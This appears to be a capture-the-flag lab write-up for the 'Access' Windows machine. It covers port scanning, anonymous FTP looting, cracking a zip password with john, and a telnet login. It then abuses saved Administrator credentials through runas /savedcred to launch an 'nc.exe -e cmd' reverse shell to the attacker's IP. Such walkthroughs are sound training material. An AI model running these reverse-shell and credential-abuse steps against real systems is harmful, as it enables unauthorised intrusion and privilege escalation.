# Access

```shellscript
┌──(kali㉿kali)-[~/Downloads/access]
└─$ sudo nmap -sC -sV 10.10.10.98 -T4  
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 20:49 EST
Nmap scan report for 10.10.10.98
Host is up (0.050s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

Get files in the ftp server. We had to switch to binary mode or it would not work

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp access.htb
Connected to access.htb.
220 Microsoft FTP Service
Name (access.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> ls 
425 Cannot open data connection.
200 PORT command successful.
150 Opening ASCII mode data connection.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Engineer
250 CWD command successful.
ftp> ls 
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************| 10870       36.47 KiB/s    00:00 ETA
226 Transfer complete.
10870 bytes received in 00:00 (32.78 KiB/s)
ftp> cd ..
250 CWD command successful.
ftp> cd Backups
250 CWD command successful.
ftp> ls 
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  5520 KiB  872.10 KiB/s    00:00 ETA
226 Transfer complete.
```

We are unable to unzip with the unzip command, so we used 7z, but it's asking for a password

```shellscript
──(kali㉿kali)-[~/Downloads/access]
└─$ unzip Access\ Control.zip 
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
   
   
┌──(kali㉿kali)-[~/Downloads/access]
└─$ 7z x Access\ Control.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
```

Opening the .mdb online, we find users and passwords

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F1UGZXb8m6ah1p0VR1La4%2Fimage.png?alt=media&#x26;token=96125d54-3e5d-45fa-82a8-ed2e55fb74ec" alt=""><figcaption></figcaption></figure>

```shellscript
┌──(kali㉿kali)-[~/Downloads/access]
└─$ zip2john Access\ Control.zip > hash
```

```shellscript
┌──(kali㉿kali)-[~/Downloads/access]
└─$ john --wordlist=pass hash                            
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 10650 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates left, minimum 32 needed for performance.
access4u@security (Access Control.zip/Access Control.pst)     
1g 0:00:00:00 DONE (2025-11-20 21:14) 100.0g/s 700.0p/s 700.0c/s 700.0C/s 020481..access4u@security
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```shellscript
┌──(kali㉿kali)-[~/Downloads/access]
└─$ 7z x Access\ Control.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870
```

We can open the .pst file online

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FwblmLAbsUcz50h0a1cMw%2Fimage.png?alt=media&#x26;token=cefff554-265f-4511-b56a-cc2bc71c8cd0" alt=""><figcaption></figcaption></figure>

```shellscript
┌──(kali㉿kali)-[~/Downloads/access]
└─$ telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

```shellscript
C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

```shellscript
C:\Users\security>runas.exe /savedcred /user:ACCESS\Administrator "nc.exe -e cmd 10.10.16.3 9001"
```

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ nc -lnvp 9001              
listening on [any] 9001 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.98] 49167
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator
```
